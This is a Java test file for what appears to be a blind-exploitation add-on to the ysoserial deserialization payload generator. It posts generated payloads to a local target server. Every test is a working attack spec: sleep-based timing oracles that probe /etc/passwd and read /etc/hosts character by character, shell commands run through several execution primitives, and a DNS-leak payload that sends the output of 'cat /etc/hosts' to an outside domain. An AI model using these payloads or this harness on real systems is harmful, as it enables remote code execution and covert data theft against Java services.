package ysoserial.blind;

import org.json.JSONObject;
import org.junit.Test;

import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

/**
 * Created by dusanklinec on 05.09.16.
 */
public class GeneratorTest {
//
    @Test
    public void testPayload1 () throws Exception {
        testPayload("{exec:[\n" +
                "  {cmd:\"sleep\", val: 5000},\n" +
                "  {cmd:\"sleep\", val: 5000},\n" +
                "], \n" +
                "  valid:true, module:1,\n" +
                "  wrap:{type:\"map\", key:\"wtf\", into:{\n" +
                "    eval2: \"java.util.HashMap hm = new java.util.HashMap(); hm.put(\\\"abc\\\", \\\"def\\\"); return hm;\"\t\n" +
                "}}}");
    }

    @Test
    public void testPayload2 () throws Exception {
        String payload1 = "{exec:[\n" +
                "  {cmd:\"sleep\", val: 5000},\n" +
                "], \n" +
                "  valid:true, module:5,\n" +
                "}}";
        testPayload(payload1);
    }

    @Test
    public void testPayload3 () throws Exception {
        testPayload("{exec:[\n" +
                "  {cmd:\"sleep\", val: 5000},\n" +
                "], \n" +
                "  valid:true, module:6,\n" +
                "}}");
    }

    @Test
    public void testPayload4 () throws Exception {
        testPayload("{exec:[\n" +
                "  {cmd:\"java\", val: 8},\n" +
                "  {cmd:\"sleep\", val: 5000},\n" +
                "]}");
    }

    @Test
    public void testPayload5 () throws Exception {
        testPayload("{exec:[\n" +
                "  {cmd:\"java\", val: 7},\n" +
                "  {cmd:\"sleep\", val: 5000},\n" +
                "]}");
    }

    @Test
    public void testPayload6 () throws Exception {
        testPayload("{exec:[\n" +
                "  {cmd:\"java\", val: 4},\n" +
                "  {cmd:\"sleep\", val: 5000},\n" +
                "]}");
    }

    @Test
    public void testPayload7 () throws Exception {
        testPayload("{exec:[\n" +
                "  {cmd:\"classload\", val: \"nonexistent\"},\n" +
                "  {cmd:\"sleep\", val: 5000},\n" +
                "]}");
    }

    @Test
    public void testPayload8 () throws Exception {
        testPayload("{exec:[\n" +
                "  {cmd:\"if\", pred:{cmd:\"fileEx\", val: \"/etc/passwd\"}, then:{cmd:\"sleep\", val: 5000}}\n" +
                "]}");
    }

    @Test
    public void testPayload9 () throws Exception {
        testPayload("{exec:[\n" +
                "  {cmd:\"if\", pred:{cmd:\"fileEx\", val: \"/etc/passwddd\"}, then:{cmd:\"sleep\", val: 5000}}\n" +
                "]}");
    }

    @Test
    public void testPayload10 () throws Exception {
        testPayload("{exec:[\n" +
                "  {cmd:\"if\", pred:{cmd:\"fileCanRead\", val: \"/etc/passwd\"}, then:{cmd:\"sleep\", val: 5000}}\n" +
                "]}");
    }

    @Test
    public void testPayload11 () throws Exception {
        testPayload("{exec:[\n" +
                "  {cmd:\"if\", pred:{cmd:\"fileCanWrite\", val: \"/etc/passwd\"}, then:{cmd:\"sleep\", val: 5000}}\n" +
                "]}");
    }

    @Test
    public void testPayload12 () throws Exception {
        testPayload("{exec:[\n" +
                "  {cmd:\"if\", pred:[\n" +
                "  {cmd:\"fileRead\", val:\"/etc/passwd\"},\n" +
                "  {cmd:\"toLower\"},\n" +
                "  {cmd:\"startsWith\", val:\"#\"}],\n" +
                "  then:{cmd:\"sleep\", val: 5000}}\n" +
                "]}");
    }

    @Test
    public void testPayload13 () throws Exception {
        testPayload("{exec:[\n" +
                "  {cmd:\"if\", pred:[\n" +
                "  {cmd:\"fileRead\", val:\"/etc/hosts\"},\n" +
                "  {cmd:\"toLower\"},\n" +
                "  {cmd:\"substr\", start:15, stop:16},\n" +
                "  {cmd:\"matches\", val:\"[j-z]\"}],\n" +
                "  then:{cmd:\"sleep\", val: 5000}}\n" +
                "]}");
    }

    @Test
    public void testPayload14 () throws Exception {
        testPayload("{exec:[\n" +
                "  {cmd:\"if\", pred:[\n" +
                "  {cmd:\"fileRead\", val:\"/etc/hosts\"},\n" +
                "  {cmd:\"toLower\"},\n" +
                "  {cmd:\"contains\", val:\"localhost\"}],\n" +
                "  then:{cmd:\"sleep\", val: 5000}}\n" +
                "]}");
    }

    @Test
    public void testPayload15 () throws Exception {
        testPayload("{exec:[\n" +
                "  {cmd:\"sleep\", val: 15000},\n" +
                "], \n" +
                "  valid:true, module:6,\n" +
                "  wrap:{type:\"map\", key:\"foo\", into:{\n" +
                "    eval2: \"java.util.HashMap m = new java.util.HashMap();m.put(\\\"hello\\\", \\\"world\\\");return m;\"\t\n" +
                "}}}");
    }

//    @Test
//    public void testPayloadKien () throws Exception {
//        testPayload("{exec:[\n" +
//                "  {cmd:\"sleep\", val: 15000},\n" +
//                "], \n" +
//                "  valid:true, module:\"cc3\",\n" +
//                "  wrap:{type:\"map\", key:\"foo\", into:{\n" +
//                "    eval2: \"java.util.HashMap m = new java.util.HashMap();m.put(\\\"hello\\\", \\\"world\\\");return m;\"\t\n" +
//                "}}}");
//    }

    @Test
    public void testPayload16 () throws Exception {
//        {exec: [
//            {cmd:"bashc", val:"ping -n 4 google.com >> /tmp/googleping 2>> /tmp/googleping && sleep 3"}
//        ]}
        testPayload("{exec: [\n" +
                "\t{cmd:\"bashc\", val:\"ping -c 4 google.com >> /tmp/googleping 2>> /tmp/googleping && sleep 3\"}\n" +
                "]}");
    }

    @Test
    public void testPayload17 () throws Exception {
//         {exec: [
//         {cmd:"execRuntime", val:["/bin/ping", "-n", "4", "google.com"]}
//         ]}
        testPayload("{exec: [\n" +
                "\t{cmd:\"execRuntime\", val:[\"/sbin/ping\", \"-c\", \"4\", \"google.com\"]}\n" +
                "]}");
    }

    @Test
    public void testPayload18 () throws Exception {
//        {exec: [
//            {cmd:"execWait", exec:"ping -n 4 google.com >> /tmp/googleping 2>> /tmp/googleping && sleep 3"}
//        ]}
        testPayload("{exec: [\n" +
                "\t{cmd:\"execWait\", exec:\"ping -c 4 google.com >> /tmp/googleping 2>> /tmp/googleping && sleep 3\"}\n" +
                "]}");
    }

    @Test
    public void testPayload19 () throws Exception {
//        {exec: [
//            {cmd:"shc", val:"ping -n 4 google.com >> /tmp/googleping 2>> /tmp/googleping && sleep 3"}
//        ]}
        testPayload("{exec: [\n" +
                "\t{cmd:\"shc\", val:\"ping -c 4 google.com >> /tmp/googleping 2>> /tmp/googleping && sleep 3\"}\n" +
                "]}");
    }

    @Test
    public void testPayload20 () throws Exception {
//        {exec: [
//            {cmd:"shcDnsLeak", val:"cat /etc/hosts", domain:"google.com", offset:30, step:30}
//        ]}
        testPayload("{exec: [\n" +
                "\t{cmd:\"shcDnsLeak\", val:\"cat /etc/hosts\", domain:\"google.com\", offset:30, step:30}\n" +
                "]}");
    }
    public static String testPayload(String payloadSpec) throws Exception {
        String payloadBin = build(payloadSpec);
        String origPayload = payloadBin;
        System.out.println(origPayload);

        // URL-friendly
        payloadBin = Utils.base64UrlFriendly(payloadBin);

        // URL encode
        payloadBin = URLEncoder.encode(payloadBin, "UTF-8");

        final String url = "http://localhost:8222/suffer/";


        final long timeStart = System.currentTimeMillis();
//        final String result = httpGet(url);
        final String results = httpPost(url,origPayload);
        System.out.println("test: " + results);
        final long elapsed = System.currentTimeMillis() - timeStart;
        System.out.println("Time: " + elapsed + " ms, output: " + results);

        return results;
    }

    public static String build(String payloadSpec) throws Exception {
        final Generator generator = new Generator();
        byte[] payload = generator.mainParse(new JSONObject(payloadSpec));

        return Utils.base64(payload);
    }

    public static String httpGet(String urlToRead) throws Exception {
        StringBuilder result = new StringBuilder();
        URL url = new URL(urlToRead);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
        String line;
        while ((line = rd.readLine()) != null) {
            result.append(line);
        }
        rd.close();
        return result.toString();
    }

    public static String httpPost(String urlToRead, String post) throws Exception {
        StringBuilder result = new StringBuilder();
        URL url = new URL(urlToRead);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        final OutputStream os = conn.getOutputStream();
        final BufferedOutputStream bos = new BufferedOutputStream(os);
        bos.write(post.getBytes("UTF-8"));
        bos.close();

        BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
        String line;
        while ((line = rd.readLine()) != null) {
            result.append(line);
        }
        rd.close();
        return result.toString();
    }
}
